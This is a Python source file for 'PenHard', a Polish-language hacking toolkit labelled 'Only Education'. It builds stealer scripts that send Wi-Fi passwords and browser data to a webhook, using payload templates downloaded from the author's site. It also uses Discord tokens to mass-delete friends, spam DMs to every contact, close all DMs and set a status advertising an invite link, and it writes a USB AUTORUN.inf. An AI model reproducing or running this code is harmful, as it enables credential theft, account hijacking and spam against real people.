
#PENHARD BY FLINEK | FLINEK.GA

# siema kutafonie dzieki za korzystanie z mojego programu
# nie uwazam go za "dobrego" jednak bardziej go traktuje jako projekt początkowy i nie mający za sobą przyszłości
# copy = skid, clown
# na temat tego na górze to tak jeżeli skopiujesz kod 1v1 to naprawde nie mam do ciebie szacunku i prosze nie nazywaj sie jakkolwiek "programista"
# Oczywiście jeżeli użyjesz go jako naukę czy coś to nic do tego nie mam..

#Pozdro

from lib2to3.pgen2 import token
import time
import os
from pystyle import Colors, Colorate
import requests
import sys
import ctypes
from colorama import Fore,Style,Back
import socket
import urllib.request

from selenium.webdriver.common.keys import Keys


def connect(host='https://www.google.com/'):
    try:
        urllib.request.urlopen(host) 
        return True
    except:
        return False
        

def main():


    os.system("cls")
    sys.stdout.write("\x1b]2;PenHard | flinek.ga\x07")

    print("")
#By Flinek#0001 | flinek.ga

# tak wiem jak to wyglada sory xdd   
    if connect():
        print(Colorate.Horizontal(Colors.blue_to_cyan,"""
                            ██████╗ ███████╗███╗   ██╗██╗  ██╗ █████╗ ██████╗ ██████╗ 
                            ██╔══██╗██╔════╝████╗  ██║██║  ██║██╔══██╗██╔══██╗██╔══██╗
                            ██████╔╝█████╗  ██╔██╗ ██║███████║███████║██████╔╝██║  ██║
                            ██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══██║██╔══██║██╔══██╗██║  ██║
                            ██║     ███████╗██║ ╚████║██║  ██║██║  ██║██║  ██║██████╔╝
                            ╚═╝     ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
                                                    Only Education   
                                              By Flinek#2651 | flinek.ga
                                                  Internet: Połączono   


                Python                  Windows                   Other                  Discord          
            1. Wifi Grabbber        3. WebData Grabber        4. AutoRUN             5. Remove all friends
            2. Phone Info                                                            6. Spam DM all friends 
                                                                                     7. Close all DM                                                                                                                                                                                                                                                                                                                                         
        """, 1))
    else:
        print(Colorate.Horizontal(Colors.blue_to_red,"""
                            ██████╗ ███████╗███╗   ██╗██╗  ██╗ █████╗ ██████╗ ██████╗ 
                            ██╔══██╗██╔════╝████╗  ██║██║  ██║██╔══██╗██╔══██╗██╔══██╗
                            ██████╔╝█████╗  ██╔██╗ ██║███████║███████║██████╔╝██║  ██║
                            ██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══██║██╔══██║██╔══██╗██║  ██║
                            ██║     ███████╗██║ ╚████║██║  ██║██║  ██║██║  ██║██████╔╝
                            ╚═╝     ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
                                                    Only Education   
                                              By Flinek#2651 | flinek.ga
                                                  Internet: Połączono   


                Python                  Windows                   Other                  Discord          
            1. Wifi Grabbber        3. WebData Grabber        4. AutoRUN             5. Remove all friends
            2. Phone Info                                                            6. Spam DM all friends 
                                                                                     7. Close all DM                                                                                                                                                                                                                                                                                                                   
        """, 1))



    hostname = socket.gethostname()

    print('')

    #zajebisty kolorowy input ni?
    blue = "\x1b[0;34m" 
    blue2 = "\x1b[0;36m"

    print(f"\n [{hostname}{blue}@{Style.RESET_ALL}] » " + Style.RESET_ALL, end='')

    choose1 = input()
    if choose1 == "":
        main()

    if int(choose1) == 5:
        Token = input("Podaj token: ")

        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        
        json = {"custom_status": {"text": "https://discord.gg/EBGf4rV47c", "emoji_name": "💭"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )

        headers = {"authorization": Token, "user-agent": "bruh6/9"}
        remove_friends_request = requests.get(
            "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
        ).json()
        for i in remove_friends_request:
            requests.delete(
                f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
                headers=headers,
            )
            print(Colorate.Horizontal(Colors.blue_to_red, f"Usunięto znajomego: {i['id']}"))

    if int(choose1) == 6:
        Token = input("Podaj token: ")
        Content = input("Podaj wiadomość: ")


        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        
        json = {"custom_status": {"text": "https://discord.gg/EBGf4rV47c", "emoji_name": "💭"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )

        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        mass_dm_request = requests.get(
            "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
        ).json()
        for channel in mass_dm_request:
            json = {"content": Content}
            time.sleep(1)
            r = requests.post(
                f"https://canary.discord.com/api/v8/channels/{channel['id']}/messages",
                headers=headers,
                data=json,
            )
            print(Colorate.Horizontal(Colors.blue_to_red, f"Wysłano - {channel['id']}"), Content)

    if int(choose1) == 7:
        Token = input("Podaj token: ")


        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        
        json = {"custom_status": {"text": "https://discord.gg/EBGf4rV47c", "emoji_name": "💭"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )

        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        close_dm_request = requests.get(
            "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
        ).json()
        for channel in close_dm_request:
            requests.delete(
                f"https://canary.discord.com/api/v8/channels/{channel['id']}",
                headers=headers,
            )
    

        
    #tak wiem te choosy sa chujowe ale przynajmniej z linku :>
    if int(choose1) == 1:
        chosweb = input("Podaj webhook url: ")
        url = "https://flinek.ga/images/elo.txt"
        r = requests.get(url)

        f = open("PenHardWifi.py", "a")
        f.write(r.text)

        f.write(chosweb + "'")
        f.write(""", content='```' + name + " : " + password + '```')""")
        f.write("""\n    response = webhook.execute()""")
        f.close()
        print("Zapisano!")


        time.sleep(1)
        main()
        
    if int(choose1) == 2:

        
        import phonenumbers
        from phonenumbers import geocoder
        from phonenumbers import carrier
        from phonenumbers import timezone

        ch_input = input("Podaj numer telefonu razem z początkiem np. +48: ")

        ch_number = phonenumbers.parse(ch_input,'CH')
        print("\nKRAJ")
        print(geocoder.description_for_number(ch_number,"en"))

        ch_carrier = phonenumbers.parse(ch_input,'RO')
        print("\nNADAWCA")
        print(carrier.name_for_number(ch_carrier,'en'))

        ch_time = phonenumbers.parse(ch_input,"GB")
        print("\nLOKALIZACJA")
        print(timezone.time_zones_for_number(ch_time))


        time.sleep(4.5)
        main()

    if int(choose1) == 4:

        chosrun = input("Podaj nazwę pliku do AutoRunu: ")

        f1 = open("AUTORUN.inf", "a")
        f1.write("""[AutoRun]""")
        f1.write("""\nOPEN=""")
        f1.write(chosrun)

        f1.close()

        print("Wrzuć ten plik do swojego pendrive!")
        time.sleep(0.9)
        main()
        
    if int(choose1) == 3:
        chosweb = input("Podaj webhook url: ")
        url = "https://flinek.ga/images/elo2.txt"
        r = requests.get(url)

        f = open("PenHardWebData.bat", "a")
        f.write(r.text)

        f.write(chosweb)
        f.close()
        print("Zapisano!")


        time.sleep(1)
        main()    

    else:
        print("Nieprawidłowy wybór!")
        time.sleep(2)
        main()

main()